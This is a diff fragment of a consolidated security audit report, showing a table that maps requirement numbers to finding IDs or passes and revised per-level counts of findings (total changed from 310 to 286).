+| 3.7.4 | FINDING-044, FINDING-051 |
+| 3.7.5 | FINDING-044, FINDING-045, FINDING-137, FINDING-144, FINDING-250 |
+| 4.1.2 | ✅ Pass |
+| 4.1.3 | FINDING-202 |
+| 4.1.4 | FINDING-284 |
+| 4.1.5 | FINDING-285 |
+| 4.2.1 | FINDING-203 |
+| 4.2.3 | ✅ Pass |
+| 5.1.1 | FINDING-204 |
+| 5.2.1 | FINDING-072 |
+| 5.2.2 | FINDING-073 |
+| 5.2.3 | FINDING-205 |
+| 5.2.4 | FINDING-206 |
+| 5.2.5 | FINDING-207 |
+| 5.3.1 | FINDING-073 |
+| 5.3.2 | FINDING-029, FINDING-120 |
+| 5.3.3 | ✅ Pass |
+| 5.4.1 | FINDING-034 |
+| 5.4.2 | FINDING-029, FINDING-208 |
+| 5.4.3 | FINDING-209 |
+| 6.1.1 | FINDING-092, FINDING-094 |
+| 6.1.2 | FINDING-228 |
+| 6.1.3 | FINDING-095 |
+| 6.2.1 | ✅ Pass |
+| 6.2.2 | ✅ Pass |
+| 6.2.5 | ✅ Pass |
+| 6.2.7 | ✅ Pass |
+| 6.2.8 | ✅ Pass |
+| 6.2.10 | ✅ Pass |
+| 6.3.1 | FINDING-094 |
+| 6.3.2 | FINDING-229 |
+| 6.3.3 | FINDING-226, FINDING-230 |
+| 6.3.4 | FINDING-015, FINDING-025 |
+| 6.3.5 | FINDING-096 |
+| 6.3.6 | ✅ Pass |
+| 6.3.7 | FINDING-097 |
+| 6.3.8 | FINDING-231, ✅ Pass |
+| 6.4.1 | ✅ Pass |
+| 6.4.2 | ✅ Pass |
+| 6.4.5 | FINDING-232 |
+| 6.5.1 | FINDING-222 |
+| 6.5.3 | FINDING-233, ✅ Pass |
+| 6.5.6 | FINDING-098 |
+| 6.5.7 | ✅ Pass |
+| 6.6.2 | ✅ Pass |
+| 6.8.1 | FINDING-099 |
+| 6.8.2 | FINDING-016 |
+| 6.8.3 | FINDING-225 |
+| 6.8.4 | FINDING-017, FINDING-100 |
+| 7.1.1 | FINDING-018 |
+| 7.1.2 | FINDING-101 |
+| 7.1.3 | FINDING-102, FINDING-234 |
+| 7.2.1 | ✅ Pass |
+| 7.2.2 | ✅ Pass |
+| 7.2.3 | FINDING-235 |
+| 7.2.4 | FINDING-103, FINDING-236 |
+| 7.3.1 | FINDING-019 |
+| 7.3.2 | FINDING-020 |
+| 7.4.1 | |
+| 7.4.2 | FINDING-021 |
+| 7.4.3 | FINDING-104 |
+| 7.4.4 | FINDING-022 |
+| 7.4.5 | FINDING-092 |
+| 7.5.1 | FINDING-105 |
+| 7.5.2 | FINDING-023 |
+| 7.5.3 | FINDING-024, FINDING-106 |
+| 7.6.1 | FINDING-107 |
+| 7.6.2 | FINDING-237 |
+| 8.1.1 | FINDING-114 |
+| 8.1.2 | FINDING-115 |
+| 8.1.3 | FINDING-116 |
+| 8.1.4 | FINDING-117 |
+| 8.2.1 | FINDING-011, FINDING-025 |
+| 8.2.2 | FINDING-011, FINDING-026 |
+| 8.2.3 | FINDING-108 |
+| 8.2.4 | FINDING-109 |
+| 8.3.1 | FINDING-011, FINDING-025, FINDING-026, FINDING-110 |
+| 8.3.2 | FINDING-111, FINDING-238 |
+| 8.3.3 | FINDING-239, ✅ Pass |
+| 8.4.1 | FINDING-027 |
+| 8.4.2 | FINDING-011, FINDING-025, FINDING-028, FINDING-112, FINDING-113 |
+| 9.1.1 | FINDING-210 |
+| 9.1.2 | FINDING-211 |
+| 9.1.3 | FINDING-212 |
+| 9.2.1 | FINDING-213 |
+| 9.2.2 | FINDING-214 |
+| 9.2.3 | FINDING-014 |
+| 9.2.4 | FINDING-074, FINDING-215, FINDING-223 |
+| 10.1.1 | FINDING-084 |
+| 10.1.2 | |
+| 10.2.1 | |
+| 10.3.1 | FINDING-085 |
+| 10.3.2 | FINDING-010, FINDING-011 |
+| 10.3.3 | FINDING-086 |
+| 10.3.4 | FINDING-087 |
+| 10.3.5 | FINDING-088 |
+| 10.4.1 | FINDING-222 |
+| 10.4.2 | FINDING-225 |
+| 10.4.4 | ✅ Pass |
+| 10.4.5 | FINDING-091 |
+| 10.4.6 | FINDING-012 |
+| 10.4.8 | FINDING-226 |
+| 10.4.9 | FINDING-092 |
+| 10.4.10 | FINDING-089 |
+| 10.4.11 | FINDING-223 |
+| 10.4.12 | FINDING-224 |
+| 10.4.13 | FINDING-090 |
+| 10.4.14 | FINDING-088 |
+| 10.4.15 | FINDING-090 |
+| 10.4.16 | FINDING-089 |
+| 10.5.1 | FINDING-013 |
+| 10.5.2 | FINDING-227 |
+| 10.5.3 | FINDING-093 |
+| 10.5.4 | FINDING-014 |
+| 10.5.5 | FINDING-226 |
+| 11.1.1 | FINDING-075, FINDING-216 |
+| 11.1.2 | FINDING-076 |
+| 11.1.3 | FINDING-077 |
+| 11.1.4 | FINDING-078 |
+| 11.2.1 | FINDING-079 |
+| 11.2.2 | FINDING-008, FINDING-217 |
+| 11.2.3 | FINDING-080 |
+| 11.2.4 | FINDING-009, FINDING-079 |
+| 11.2.5 | FINDING-081 |
+| 11.3.1 | ✅ Pass |
+| 11.3.2 | FINDING-082 |
+| 11.3.3 | ✅ Pass |
+| 11.3.4 | FINDING-217, ✅ Pass |
+| 11.3.5 | ✅ Pass |
+| 11.4.1 | FINDING-218 |
+| 11.4.2 | FINDING-079 |
+| 11.4.3 | ✅ Pass |
+| 11.4.4 | FINDING-079, FINDING-219 |
+| 11.5.1 | FINDING-080 |
+| 11.5.2 | ✅ Pass |
+| 11.6.1 | FINDING-079 |
+| 11.7.1 | FINDING-083 |
+| 11.7.2 | FINDING-220, FINDING-221 |
+| 12.1.1 | FINDING-049, FINDING-151 |
+| 12.1.2 | FINDING-050 |
+| 12.1.4 | FINDING-152 |
+| 12.1.5 | FINDING-253 |
+| 12.2.1 | FINDING-051, FINDING-154 |
+| 12.2.2 | FINDING-051, FINDING-153 |
+| 12.3.1 | FINDING-051, FINDING-254 |
+| 12.3.2 | FINDING-155 |
+| 12.3.3 | FINDING-255 |
+| 12.3.4 | FINDING-156 |
+| 12.3.5 | FINDING-255 |
+| 13.1.1 | FINDING-157 |
+| 13.1.2 | FINDING-158 |
+| 13.1.3 | FINDING-159 |
+| 13.1.4 | FINDING-160 |
+| 13.2.1 | FINDING-256, FINDING-257 |
+| 13.2.2 | FINDING-161, FINDING-258 |
+| 13.2.3 | ✅ Pass |
+| 13.2.4 | FINDING-162 |
+| 13.2.5 | FINDING-259 |
+| 13.2.6 | FINDING-163 |
+| 13.3.1 | FINDING-052 |
+| 13.3.2 | FINDING-164 |
+| 13.3.3 | FINDING-053, FINDING-054 |
+| 13.3.4 | FINDING-055, FINDING-165 |
+| 13.4.1 | FINDING-166 |
+| 13.4.2 | FINDING-167, FINDING-261 |
+| 13.4.3 | FINDING-262, ✅ Pass |
+| 13.4.4 | FINDING-263 |
+| 13.4.5 | FINDING-264 |
+| 13.4.6 | FINDING-168, FINDING-265 |
+| 13.4.7 | FINDING-040, FINDING-169 |
+| 14.1.1 | FINDING-170 |
+| 14.1.2 | FINDING-171 |
+| 14.2.1 | FINDING-266 |
+| 14.2.2 | FINDING-056 |
+| 14.2.3 | ✅ Pass |
+| 14.2.4 | FINDING-167, FINDING-172, FINDING-267, FINDING-268 |
+| 14.2.5 | FINDING-056, FINDING-173 |
+| 14.2.6 | FINDING-174, FINDING-175, FINDING-269 |
+| 14.2.7 | FINDING-268, FINDING-270 |
+| 14.2.8 | FINDING-271 |
+| 14.3.1 | FINDING-092, FINDING-176 |
+| 14.3.2 | FINDING-056 |
+| 14.3.3 | FINDING-056, FINDING-272 |
+| 15.1.1 | FINDING-057, FINDING-078 |
+| 15.1.2 | FINDING-058, FINDING-177 |
+| 15.1.3 | FINDING-059 |
+| 15.1.4 | FINDING-178 |
+| 15.1.5 | FINDING-179 |
+| 15.2.1 | FINDING-060, FINDING-079 |
+| 15.2.2 | FINDING-273 |
+| 15.2.3 | FINDING-180 |
+| 15.2.4 | FINDING-181, FINDING-274 |
+| 15.2.5 | FINDING-275 |
+| 15.3.2 | FINDING-276 |
+| 15.3.3 | FINDING-182 |
+| 15.3.5 | FINDING-277 |
+| 15.3.7 | FINDING-278 |
+| 15.4.1 | FINDING-183 |
+| 15.4.2 | FINDING-184 |
+| 15.4.3 | FINDING-183 |
+| 15.4.4 | FINDING-279 |
+| 16.1.1 | FINDING-061, FINDING-185 |
+| 16.2.1 | FINDING-062, FINDING-063, FINDING-186, FINDING-187 |
+| 16.2.2 | FINDING-188, FINDING-280 |
+| 16.2.3 | FINDING-167, FINDING-281 |
+| 16.2.4 | FINDING-189, FINDING-282 |
+| 16.2.5 | FINDING-064, FINDING-190, FINDING-191 |
+| 16.3.1 | FINDING-065, FINDING-192 |
+| 16.3.2 | |
+| 16.3.3 | FINDING-066, FINDING-067, FINDING-193 |
+| 16.3.4 | FINDING-066, FINDING-194, FINDING-195, FINDING-283 |
+| 16.4.1 | FINDING-118 |
+| 16.4.2 | FINDING-196, FINDING-197 |
+| 16.4.3 | FINDING-063, FINDING-068 |
+| 16.5.1 | FINDING-167, FINDING-198 |
+| 16.5.2 | FINDING-069, FINDING-199 |
+| 16.5.3 | FINDING-030, FINDING-070, FINDING-110, FINDING-200 |
+| 16.5.4 | FINDING-071, FINDING-201 |
+
+## 7. Level Coverage Analysis
 
 
 **Audit scope:** up to L3
 
 | Level | Sections Audited | Findings Found |
 |-------|-----------------|----------------|
-| L1 | 70 | 69 |
-| L2 | 183 | 180 |
-| L3 | 92 | 112 | **Total consolidated findings: 310**
+| L1 | 70 | 60 |
+| L2 | 183 | 171 |
+| L3 | 92 | 97 |
+
+**Total consolidated findings: 286**
 
 *End of Consolidated Security Audit Report*
